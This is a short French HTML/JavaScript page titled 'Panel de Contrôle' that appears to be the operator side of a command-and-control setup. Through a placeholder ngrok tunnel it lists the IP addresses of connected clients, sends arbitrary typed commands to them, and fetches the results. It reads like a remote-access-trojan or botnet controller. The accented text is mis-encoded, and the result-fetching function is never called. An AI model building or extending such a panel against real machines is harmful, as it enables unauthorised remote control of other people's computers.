<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Contr√¥le</title>
</head>
<body>
    <h1>Panel de Contr√¥le</h1>

    <h2>Clients Connect√©s</h2>
    <ul id="client-list"></ul>

    <h2>Envoyer une Commande</h2>
    <input type="text" id="command" placeholder="Tapez une commande...">
    <button onclick="sendCommand()">Envoyer</button>

    <h2>R√©sultat</h2>
    <pre id="output"></pre>

    <script>
        const serverUrl = "https://xxxx.ngrok-free.app"; // üî• Mets ton lien Ngrok ici

        function updateClients() {
            fetch(serverUrl + "/connected_clients")
                .then(response => response.json())
                .then(data => {
                    let list = document.getElementById("client-list");
                    list.innerHTML = ""; 

                    data.connected_clients.forEach(ip => {
                        let item = document.createElement("li");
                        item.textContent = ip;
                        list.appendChild(item);
                    });
                })
                .catch(err => console.error("Erreur de connexion:", err));
        }

        function sendCommand() {
            const command = document.getElementById("command").value;
            fetch(serverUrl + "/send_command", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ command: command })
            }).then(() => alert("Commande envoy√©e !"));
        }

        function getResult() {
            fetch(serverUrl + "/result")
                .then(response => response.text())
                .then(data => {
                    document.getElementById("output").textContent = data;
                })
                .catch(err => console.error("Erreur de r√©cup√©ration du r√©sultat:", err));
        }

        setInterval(updateClients, 5000);
    </script>
</body>
</html>
